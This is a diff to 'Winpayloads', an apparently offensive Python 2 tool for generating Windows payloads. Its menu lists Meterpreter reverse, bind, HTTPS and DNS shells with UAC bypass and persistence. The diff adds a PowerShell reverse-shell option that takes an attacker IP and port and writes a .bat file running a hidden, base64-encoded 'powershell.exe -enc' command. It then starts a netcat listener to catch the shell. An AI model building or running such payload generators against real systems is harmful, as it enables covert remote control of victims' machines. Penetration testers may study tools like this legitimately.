@@ -43,16 +43,17 @@ print "  | |/ |/ / / / / / ____/ /_/ / /_/ / / /_/ / /_/ / /_/ (__  )".center(t.
 print "  |__/|__/_/_/ /_/_/    \__,_/\__, /_/\____/\__,_/\__,_/____/".center(t.width)
 print "    /____/Charlie Dean".center(t.width + 11)
 print t.normal + '=' * (t.width / 2 - 3) + "-MENU-" + '=' * (t.width / 2 - 3)
-print ('[1] Windows Reverse Shell' + t.bold_green + '(Stageless)' +
+print ('[1] Windows Reverse Shell' + t.bold_green + ' (Stageless)' +
        t.bold_red + ' [Shellter]').center(t.width - 44) + t.normal
-print ('[2] Windows Reverse Meterpreter' + t.bold_green + '(Staged)' + t.bold_red +
+print ('[2] Windows Reverse Meterpreter' + t.bold_green + ' (Staged)' + t.bold_red +
        ' [Shellter, UacBypass, Priv Esc Checks, Persistence]').center(t.width) + t.normal
-print ('[3] Windows Bind Meterpreter' + t.bold_green + '(Staged)' + t.bold_red +
-       ' [Shellter, UacBypass, Priv Esc Checks, Persistence]').center(t.width - 4) + t.normal
-print ('[4] Windows Reverse Meterpreter HTTPS' + t.bold_green + '(Staged)' +
+print ('[3] Windows Bind Meterpreter' + t.bold_green + ' (Staged)' + t.bold_red +
+       ' [Shellter, UacBypass, Priv Esc Checks, Persistence]').center(t.width - 2) + t.normal
+print ('[4] Windows Reverse Meterpreter HTTPS' + t.bold_green + ' (Staged)' +
        t.bold_red + ' [Shellter, UacBypass, Priv Esc Checks, Persistence]').center(t.width + 6) + t.normal
-print ('[5] Windows Reverse Meterpreter DNS' + t.bold_green + '(Staged)' +
+print ('[5] Windows Reverse Meterpreter DNS' + t.bold_green + ' (Staged)' +
        t.bold_red + ' [Shellter, UacBypass, Priv Esc Checks, Persistence]').center(t.width + 4) + t.normal
+print ('[ps] Powershell Shells' + t.bold_green + ' (MENU)').center(t.width - 72) + t.normal
 print '=' * t.width
 print ('Type \'help\' or \'?\' to get detailed infomation').center(t.width + 4) + t.normal
 
@@ -73,11 +74,28 @@ try:
             break
         elif menuchoice == '4':
             payloadchoice = SHELLCODE.windows_met_rev_https_shell
-            payload = 'Windows Meterpreter Reverse HTTPS '
+            payload = 'Windows Meterpreter Reverse HTTPS'
             break
         elif menuchoice == '5':
             payloadchoice = SHELLCODE.windows_met_rev_shell_dns
-            payload = 'Windows Meterpreter Reverse Shell DNS '
+            payload = 'Windows Meterpreter Reverse Shell DNS'
+            break
+        elif menuchoice == 'ps':
+            print t.clear
+            print '=' * t.width + t.bold_red
+            print " _       ___       ____              __                __".center(t.width)
+            print "   | |     / (_)___  / __ \____ ___  __/ /___  ____ _____/ /____".center(t.width)
+            print "   | | /| / / / __ \/ /_/ / __ `/ / / / / __ \/ __ `/ __  / ___/".center(t.width)
+            print "  | |/ |/ / / / / / ____/ /_/ / /_/ / / /_/ / /_/ / /_/ (__  )".center(t.width)
+            print "  |__/|__/_/_/ /_/_/    \__,_/\__, /_/\____/\__,_/\__,_/____/".center(t.width)
+            print "    /____/Charlie Dean".center(t.width + 11)
+            print t.normal + '=' * (t.width / 2 - 3) + "-MENU-" + '=' * (t.width / 2 - 3)
+            print ('[10] Windows Interactive Reverse Powershell Shell').center(t.width + 4) + t.normal
+            print '=' * t.width
+            print ('Type \'help\' or \'?\' to get detailed infomation').center(t.width + 4) + t.normal
+        elif menuchoice == '10':
+            payloadchoice = SHELLCODE.windows_ps_rev_shell
+            payload = 'Windows Interactive Reverse Powershell Shell'
             break
         elif menuchoice == 'help' or menuchoice == '?':
             FUNCTIONS().winpayloads_help()
@@ -170,6 +188,28 @@ try:
         shellcode = payloadchoice % (DNSaddr,porthex)
         print t.bold_green + '[*] DNS HOSTNAME SET AS %s\n[*] PORT SET AS %s\n' % (DNSaddr, portnum) + t.normal
 
+    elif menuchoice == '10':
+        portnum = raw_input(
+            '\n[*] Press Enter For Default Port(4444)\n[*] Port> ')
+        if len(portnum) is 0:
+            portnum = 4444
+
+        if iperror == False:
+            ipaddr = raw_input(
+                '\n[*] Press Enter To Get Local Ip Automatically\n[*] IP> ')
+            if len(ipaddr) is 0:
+                ipaddr = IP
+        else:
+            print t.bold_red + 'Error Getting Ip Automatically' + t.normal
+            ipaddr = raw_input(
+                '\n[*] Please Enter Your IP Manually(Automatic Disabled)\n[*] IP> ')
+        shellcode = payloadchoice % (ipaddr,portnum,"|%{0}")
+        powershellbatfile = open('%s/%s.bat'%(payloaddir, payload),'w')
+        powershellbatfile.write('powershell.exe -WindowStyle Hidden -enc %s'%(base64.b64encode(shellcode.encode('utf_16_le'))))
+        powershellbatfile.close()
+        os.system('nc -lvp %s'%portnum)
+        raise KeyboardInterrupt
+
     if menuchoice == '2' or menuchoice == '3' or menuchoice == '4' or menuchoice == '5':
         want_UACBYPASS = raw_input(
             t.bold_red + '[*] Try UAC Bypass(Only Works For Local Admin Account)? y/[n]:' + t.normal)
@@ -243,7 +283,7 @@ try:
         os.system('rm %s/dist -r' % payloaddir)
         os.system('rm %s/build -r' % payloaddir)
         os.system('rm %s/*.spec' % payloaddir)
-        os.system('rm %s/payload.py' % payloaddir)
+        #os.system('rm %s/payload.py' % payloaddir)
         print t.normal + '\n[*] Payload.exe Has Been Generated And Is Located Here: ' + t.bold_green + '%s/%s' % (payloaddir, payloadname) + t.normal
 
     if want_to_payloadinexe.lower() == 'y':
